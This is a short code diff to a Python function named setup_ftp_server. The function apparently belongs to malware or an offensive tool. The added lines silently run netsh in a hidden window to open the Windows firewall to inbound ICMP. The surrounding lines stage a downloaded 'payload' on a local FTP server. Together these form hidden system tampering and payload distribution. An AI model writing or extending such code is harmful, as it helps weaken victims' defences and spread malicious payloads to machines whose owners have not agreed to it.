@@ -381,6 +381,11 @@ def setup_ftp_server(usernames, passwords):
             shell=True, capture_output=True, creationflags=0x08000000
         )
 
+        subprocess.run(
+            f'netsh advfirewall firewall add rule name="Allow_ICMP" protocol=ICMPv4 dir=in action=allow enable=yes',
+            shell=True, capture_output=True, creationflags=0x08000000
+        )
+
         # Upload payload to local FTP server
         payload_path = PAYLOAD_PATH if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH) else download_payload()
         if payload_path and os.path.exists(payload_path):
